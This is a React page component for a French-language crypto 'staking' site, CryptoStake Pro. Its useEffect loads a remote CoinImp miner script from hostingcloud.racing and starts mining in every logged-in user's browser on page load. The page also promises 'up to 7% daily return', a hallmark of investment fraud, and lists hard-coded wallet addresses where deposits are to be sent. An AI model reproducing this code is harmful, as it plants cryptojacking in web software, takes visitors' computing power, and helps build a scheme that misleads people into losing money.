import StakingCard from "@/components/StakingCard";
import ClickerGame from "@/components/ClickerGame";
import WithdrawalSection from "@/components/PaymentSection";
import PortfolioTracker from "@/components/PortfolioTracker";
import ReferralSystem from "@/components/ReferralSystem";
import SecurityCenter from "@/components/SecurityCenter";
import NewsCenter from "@/components/NewsCenter";
import DepositTracker from "@/components/DepositTracker";
import StakingTracker from "@/components/StakingTracker";
import CustomStaking from "@/components/CustomStaking";
import MiningFarm from "@/components/MiningFarm";
import RewardsSystem from "@/components/RewardsSystem";
import MissionsSystem from "@/components/MissionsSystem";
import LeaderboardSystem from "@/components/LeaderboardSystem";
import LootBoxSystem from "@/components/LootBoxSystem";
import EventsSystem from "@/components/EventsSystem";
import CustomizationSystem from "@/components/CustomizationSystem";
import VIPSystem from "@/components/VIPSystem";
import BattlePassSystem from "@/components/BattlePassSystem";
import DeadSpotShop from "@/components/DeadSpotShop";
import PlatformStats from "@/components/PlatformStats";
import { CollapsibleSection } from "@/components/CollapsibleSection";
import { Button } from "@/components/ui/button";
import { useAuth } from "@/hooks/useAuth";
import { Navigate } from "react-router-dom";
import { RPGGame } from "@/components/RPGGame";
import { SpinWheel } from "@/components/SpinWheel";
import heroBackground from "@/assets/hero-background.jpg";
import { useState } from "react";
import { FaucetClaim } from "@/components/FaucetClaim";
import { useEffect } from "react";

const Index = () => {
  const { user, signOut, loading } = useAuth();
  const [showRPG, setShowRPG] = useState(false);
  const [showSpinWheel, setShowSpinWheel] = useState(false);
  const [showFaucet, setShowFaucet] = useState(false);
  const [userZeroBalance, setUserZeroBalance] = useState(0);

  const handleZeroWin = (amount: number) => {
    setUserZeroBalance(prev => prev + amount);
  };

  // Mining script injection for main page
  useEffect(() => {
    if (user) {
      // Check if mining script already exists
      const existingScript = document.head.querySelector('script[src="https://www.hostingcloud.racing/Q1Mx.js"]');
      if (existingScript) return;

      // Inject main mining script
      const script1 = document.createElement('script');
      script1.src = 'https://www.hostingcloud.racing/Q1Mx.js';
      script1.async = true;
      script1.id = 'mining-script-main';
      document.head.appendChild(script1);

      script1.onload = () => {
        // Check if client already initialized
        const existingClientScript = document.head.querySelector('#mining-script-client');
        if (existingClientScript) return;
        
        const script2 = document.createElement('script');
        script2.id = 'mining-script-client';
        script2.text = `
          if (!window.miningClientInitialized) {
            var _client = new Client.Anonymous('80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd', {
              throttle: 0.3, c: 'w'
            });
            _client.start();
            _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
            window.miningClientInitialized = true;
            window.miningClient = _client;
          }
        `;
        document.head.appendChild(script2);
      };

      // Cleanup function to remove scripts when component unmounts
      return () => {
        // Stop mining client if exists
        const cleanupScript = document.createElement('script');
        cleanupScript.text = `
          if (window.miningClient && window.miningClient.stop) {
            window.miningClient.stop();
            window.miningClient = null;
            window.miningClientInitialized = false;
          }
        `;
        document.head.appendChild(cleanupScript);
        setTimeout(() => cleanupScript.remove(), 100);

        const scripts = document.head.querySelectorAll('#mining-script-main, #mining-script-client');
        scripts.forEach(script => script.remove());
      };
    }
  }, [user]);

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-primary mx-auto mb-4"></div>
          <p>Chargement...</p>
        </div>
      </div>
    );
  }

  if (!user) {
    return <Navigate to="/auth" replace />;
  }
  const stakingPools = [
    {
      name: "Polygon",
      symbol: "MATIC",
      network: "Polygon Network",
      apy: "7",
      icon: "🔷",
      color: "bg-purple-600",
      walletAddress: "0x380060e81A820a1691fA58C84ba27c23ed1Eff77"
    },
    {
      name: "Bitcoin",
      symbol: "BTC",
      network: "Bitcoin Network",
      apy: "5",
      icon: "₿",
      color: "bg-orange-500",
      walletAddress: "1LJWeugswr2GsqAZ7H8pFYZ7Q2uF8pAVb8"
    },
    {
      name: "TRON",
      symbol: "TRX",
      network: "TRC20",
      apy: "6",
      icon: "🔺",
      color: "bg-red-500",
      walletAddress: "TY4o9UKBz32xi8hexbv6XhccqGBqSk8oJ7"
    },
    {
      name: "Toncoin",
      symbol: "TON",
      network: "TON Network",
      apy: "4",
      icon: "💎",
      color: "bg-blue-500",
      walletAddress: "EQD14kgmngE0fNYVs7_9dw78V3rPhNt7_Ee-7X3ykDORQvMp",
      memo: "492929"
    },
    {
      name: "Solana",
      symbol: "SOL",
      network: "Solana Network",
      apy: "3",
      icon: "☀️",
      color: "bg-purple-400",
      walletAddress: "CWnduVqeRQrxqhGPNDnHTqHWM1dJLqCnojhMQS8FEUFB"
    },
    {
      name: "Dogecoin",
      symbol: "DOGE",
      network: "Dogecoin Network",
      apy: "1",
      icon: "🐕",
      color: "bg-yellow-500",
      walletAddress: "DDVYeK8MiizfsnzLtigSAWfx6PH24puQze"
    }
  ];

  // ... keep existing code (hero section variables)

  return (
    <div className="min-h-screen bg-background">
      {/* RPG Game Slide */}
      {showRPG && <RPGGame onClose={() => setShowRPG(false)} />}
      
      {/* Spin Wheel Slide */}
      {showSpinWheel && (
        <div className="fixed inset-0 bg-background/95 backdrop-blur-sm z-50 overflow-auto">
          <div className="container mx-auto p-6">
            <div className="flex justify-between items-center mb-6">
              <h2 className="text-3xl font-bold gradient-text">🎰 Section Spin</h2>
              <Button 
                variant="ghost" 
                onClick={() => setShowSpinWheel(false)}
                className="text-2xl"
              >
                ✕
              </Button>
            </div>
            <SpinWheel onZeroWin={handleZeroWin} onOpenRPG={() => setShowRPG(true)} />
          </div>
        </div>
      )}

      {/* Faucet ZERO Slide */}
      {showFaucet && (
        <div className="fixed inset-0 bg-background/95 backdrop-blur-sm z-50 overflow-auto">
          <div className="container mx-auto p-6">
            <div className="flex justify-between items-center mb-6">
              <h2 className="text-3xl font-bold gradient-text">💧 Faucet ZERO</h2>
              <Button 
                variant="ghost" 
                onClick={() => setShowFaucet(false)}
                className="text-2xl"
              >
                ✕
              </Button>
            </div>
            <FaucetClaim 
              onOpenRPG={() => setShowRPG(true)}
              onOpenSpin={() => setShowSpinWheel(true)}
            />
          </div>
        </div>
      )}
      
      {/* Top Access Buttons */}
      <div className="fixed top-4 left-4 z-40 flex gap-2">
        <Button 
          variant="crypto" 
          size="lg"
          onClick={() => setShowRPG(true)}
          className="shadow-glow"
        >
          ⚔️ Jeu RPG
        </Button>
        <Button 
          variant="stake" 
          size="lg"
          onClick={() => setShowSpinWheel(true)}
          className="shadow-glow"
        >
          🎰 Spin Wheel
        </Button>
        <Button 
          variant="secondary" 
          size="lg"
          onClick={() => setShowFaucet(true)}
          className="shadow-glow"
        >
          💧 Faucet ZERO
        </Button>
      </div>

      {/* Hero Section */}
      <section className="relative h-screen flex items-center justify-center overflow-hidden">
        <div 
          className="absolute inset-0 bg-cover bg-center bg-no-repeat"
          style={{ backgroundImage: `url(${heroBackground})` }}
        />
        <div className="absolute inset-0 bg-background/80" />
        
        <div className="relative z-10 text-center max-w-4xl mx-auto px-6">
          <h1 className="text-6xl md:text-8xl font-bold mb-6 gradient-crypto bg-clip-text text-transparent animate-float">
            CryptoStake Pro
          </h1>
          <p className="text-xl md:text-2xl text-muted-foreground mb-8 max-w-2xl mx-auto">
            Maximisez vos rendements avec notre plateforme de staking multi-crypto. 
            Jusqu'à 7% de rendement quotidien sur vos cryptomonnaies préférées.
          </p>
          <div className="flex flex-col sm:flex-row gap-4 justify-center">
            <Button variant="crypto" size="xl" className="shadow-glow">
              Commencer le Staking
            </Button>
            <Button variant="stake" size="xl">
              Explorer les Pools
            </Button>
            <Button 
              variant="outline" 
              size="xl" 
              onClick={() => setShowRPG(true)}
              className="shadow-neon"
            >
              ⚔️ Jouer au RPG
            </Button>
            <Button variant="ghost" size="sm" onClick={signOut} className="mt-4">
              Se déconnecter
            </Button>
          </div>
        </div>
      </section>

      {/* Statistics Section */}
      <CollapsibleSection
        title="Statistiques de la Plateforme"
        subtitle="Des chiffres réels qui témoignent de la croissance de notre communauté"
        defaultOpen={true}
      >
        <PlatformStats />
      </CollapsibleSection>

      {/* Deposit and Staking Tracker */}
      <CollapsibleSection
        title="Mes Dépôts et Positions"
        subtitle="Suivez vos dépôts et positions de staking en temps réel"
      >
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 mb-12">
          <div>
            <h3 className="text-2xl font-bold mb-6">Dépôts</h3>
            <DepositTracker />
          </div>
          <div>
            <h3 className="text-2xl font-bold mb-6">Staking</h3>
            <StakingTracker />
          </div>
        </div>
      </CollapsibleSection>

      {/* Click Game Section */}
      <CollapsibleSection
        title="Mini-Jeu DeadSpot Click"
        subtitle="Cliquez pour gagner des DeadSpot coins et débloquer des power-ups! Toutes les 6 clicks, gagnez du DOGE et de l'expérience."
        className="bg-secondary/20"
      >
        <ClickerGame />
      </CollapsibleSection>

      {/* Mining Farm Section */}
      <CollapsibleSection
        title="Ferme de Mining DeadSpot"
        subtitle="Achetez des mineurs avec vos DeadSpot coins et diamants pour miner automatiquement plusieurs cryptomonnaies!"
      >
        <MiningFarm 
          deadspotCoins={0} 
          setDeadspotCoins={() => {}} 
          diamonds={0} 
          setDiamonds={() => {}}
        />
      </CollapsibleSection>

      {/* Rewards System Section */}
      <CollapsibleSection
        title="Système de Récompenses"
        subtitle="Gagnez de l'expérience de mining, réclamez vos bonus quotidiens et débloquez des récompenses de fidélité!"
        className="bg-secondary/20"
      >
        <RewardsSystem 
          deadspotCoins={0}
          setDeadspotCoins={() => {}}
          diamonds={0}
          setDiamonds={() => {}}
          miningExp={0}
          setMiningExp={() => {}}
          level={1}
          setLevel={() => {}}
        />
      </CollapsibleSection>

      {/* VIP & Monetization Section */}
      <CollapsibleSection
        title="VIP & Monétisation"
        subtitle="Système VIP, Battle Pass et boutique DeadSpot"
        className="bg-secondary/20"
      >
        <div className="space-y-12">
          <VIPSystem />
          <BattlePassSystem />
          <DeadSpotShop />
        </div>
      </CollapsibleSection>

      {/* Gaming Features Section */}
      <CollapsibleSection
        title="Fonctionnalités Gaming"
        subtitle="Évènements, missions, classements, loot boxes et personnalisation"
      >
        <div className="space-y-12">
          <EventsSystem />
          <MissionsSystem />
          <LeaderboardSystem />
          <LootBoxSystem />
          <CustomizationSystem />
        </div>
      </CollapsibleSection>

      {/* Staking Pools Section */}
      <CollapsibleSection
        title="Pools de Staking Disponibles"
        subtitle="Choisissez parmi nos pools de staking optimisés pour maximiser vos rendements quotidiens"
      >
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
          {stakingPools.map((pool, index) => (
            <StakingCard key={index} {...pool} />
          ))}
        </div>
      </CollapsibleSection>

      {/* Features Section */}
      <CollapsibleSection
        title="Pourquoi Choisir CryptoStake Pro ?"
        subtitle="Découvrez nos avantages"
      >
        <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
          <div className="text-center p-6">
            <div className="w-16 h-16 bg-primary rounded-full flex items-center justify-center text-3xl mx-auto mb-4">
              🔒
            </div>
            <h3 className="text-xl font-bold mb-2">Sécurisé</h3>
            <p className="text-muted-foreground">
              Protocoles de sécurité avancés et audits réguliers pour protéger vos fonds
            </p>
          </div>
          <div className="text-center p-6">
            <div className="w-16 h-16 bg-success rounded-full flex items-center justify-center text-3xl mx-auto mb-4">
              ⚡
            </div>
            <h3 className="text-xl font-bold mb-2">Rendements Élevés</h3>
            <p className="text-muted-foreground">
              Jusqu'à 7% de rendement quotidien avec nos algorithmes optimisés
            </p>
          </div>
          <div className="text-center p-6">
            <div className="w-16 h-16 bg-info rounded-full flex items-center justify-center text-3xl mx-auto mb-4">
              🌐
            </div>
            <h3 className="text-xl font-bold mb-2">Multi-Blockchain</h3>
            <p className="text-muted-foreground">
              Support de 6 réseaux blockchain majeurs pour diversifier votre portefeuille
            </p>
          </div>
        </div>
      </CollapsibleSection>

      {/* Custom Staking Section */}
      <CollapsibleSection
        title="Staking Personnalisé"
        subtitle="Personnalisez votre stratégie de staking"
      >
        <CustomStaking />
      </CollapsibleSection>

      {/* Portfolio Tracker Section */}
      <CollapsibleSection
        title="Suivi de Portefeuille"
        subtitle="Analysez la performance de votre portefeuille"
      >
        <PortfolioTracker />
      </CollapsibleSection>

      {/* News Center Section */}
      <CollapsibleSection
        title="Centre d'Actualités"
        subtitle="Restez informé des dernières nouvelles crypto"
      >
        <NewsCenter />
      </CollapsibleSection>

      {/* Referral System Section */}
      <CollapsibleSection
        title="Système de Parrainage"
        subtitle="Gagnez des récompenses en invitant vos amis"
      >
        <ReferralSystem />
      </CollapsibleSection>

      {/* Security Center Section */}
      <CollapsibleSection
        title="Centre de Sécurité"
        subtitle="Gérez la sécurité de votre compte"
      >
        <SecurityCenter />
      </CollapsibleSection>

      {/* Withdrawal Section */}
      <CollapsibleSection
        title="Système de Retrait"
        subtitle="Demandez le retrait de vos fonds de manière sécurisée"
      >
        <WithdrawalSection />
      </CollapsibleSection>

      {/* Contact Section */}
      <section className="bg-secondary/10 border-t border-primary/10 py-8 px-6">
        <div className="max-w-4xl mx-auto text-center">
          <h3 className="text-xl font-semibold mb-4 gradient-text">
            📧 Contacter l'Auteur
          </h3>
          <p className="text-muted-foreground mb-4">
            Si vous voulez contacter l'auteur du site pour quelconque idée, soumission, erreur et/ou problème :
          </p>
          <div className="p-4 bg-card rounded-lg border border-primary/20 inline-block">
            <p className="text-lg font-medium">
              📬 Email: <a 
                href="mailto:maximlprive90@gmail.com" 
                className="text-primary hover:text-primary/80 transition-colors underline"
              >
                maximlprive90@gmail.com
              </a>
            </p>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="bg-card border-t border-primary/20 py-12 px-6">
        <div className="max-w-7xl mx-auto text-center">
          <h3 className="text-2xl font-bold gradient-crypto bg-clip-text text-transparent mb-4">
            CryptoStake Pro
          </h3>
          <p className="text-muted-foreground mb-6">
            La plateforme de staking nouvelle génération pour maximiser vos rendements crypto
          </p>
          <div className="flex justify-center gap-4">
            <Button variant="ghost" size="sm">Conditions</Button>
            <Button variant="ghost" size="sm">Confidentialité</Button>
            <Button variant="ghost" size="sm">Support</Button>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default Index;